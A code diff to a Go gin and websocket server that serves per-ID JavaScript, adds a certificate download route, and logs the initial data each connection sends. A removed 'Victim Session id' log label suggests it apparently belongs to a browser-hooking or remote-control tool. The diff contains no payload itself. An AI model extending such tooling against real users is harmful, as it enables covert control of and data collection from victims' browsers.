@@ -22,8 +22,11 @@ var WebsocketConnMap = SafeWebsocketConnMap{mapper: sync.Map{}}
 var fileContent string
 
 func RunServer(rch define.RelayChan, buffer io.Writer) {
-	router := gin.Default()
 	gin.DefaultWriter = buffer
+	gin.DisableConsoleColor()
+
+	router := gin.Default()
+
 	_ = router.SetTrustedProxies(nil) // disable
 	var upgrader = websocket.Upgrader{
 		ReadBufferSize:  1024 * 4,
@@ -32,6 +35,12 @@ func RunServer(rch define.RelayChan, buffer io.Writer) {
 			return true
 		},
 	}
+
+	router.GET("/cert", func(c *gin.Context) {
+		c.Header("Content-Disposition", "attachment; filename=cert.pem")
+		c.Header("Content-Type", "application/text/plain")
+		c.FileAttachment("cert/cert.pem", "cert.pem")
+	})
 
 	router.GET("/:id/init", func(c *gin.Context) {
 		c.Header("Content-Type", "application/javascript")
@@ -51,7 +60,22 @@ func RunServer(rch define.RelayChan, buffer io.Writer) {
 		connId := uuid.New().String()
 		WebsocketConnMap.Set(connId, conn)
 		defer WebsocketConnMap.Delete(connId)
-		l := log.WithField("Victim Session id", connId)
+		log.Infof("receive new connection! alloc new session id: %v", connId)
+		l := log.WithField("session", connId)
+
+		// init!
+		_, p, err := conn.ReadMessage()
+		if err != nil {
+			l.Errorf("Init read message failed")
+		}
+		var msg map[string]string
+		if err = json.Unmarshal(p, &msg); err != nil {
+			l.Errorf("Init message unmarshal failed. reason: %s, data: %v", err.Error(), string(p))
+		} else {
+			for k, v := range msg {
+				l.Infof("%s: %s\n", k, v)
+			}
+		}
 
 		for {
 			_, p, err := conn.ReadMessage()
